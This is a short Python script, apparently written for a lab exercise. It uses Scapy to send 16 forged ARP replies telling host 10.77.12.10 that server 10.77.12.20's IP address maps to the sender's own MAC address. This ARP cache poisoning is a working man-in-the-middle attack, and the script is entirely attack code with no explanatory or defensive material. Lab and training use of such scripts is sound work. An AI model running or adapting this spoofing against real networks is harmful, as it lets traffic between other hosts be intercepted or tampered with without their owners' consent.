"""Send 16 forged ARP replies to host_a inside the disposable lab."""
from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp

host_a_ip = "10.77.12.10"
server_1_ip = "10.77.12.20"
iface = "eth0"
host_a_mac = getmacbyip(host_a_ip)
if not host_a_mac:
    raise SystemExit("host_a MAC unavailable; start the lab and establish the mapping")
host_b_mac = get_if_hwaddr(iface)
packet = Ether(src=host_b_mac, dst=host_a_mac) / ARP(
    op=2, psrc=server_1_ip, pdst=host_a_ip,
    hwsrc=host_b_mac, hwdst=host_a_mac,
)
sendp(packet, iface=iface, count=16, inter=0.25, verbose=False)
print(f"Sent 16 forged ARP replies: {server_1_ip} is-at {host_b_mac} to {host_a_ip}")
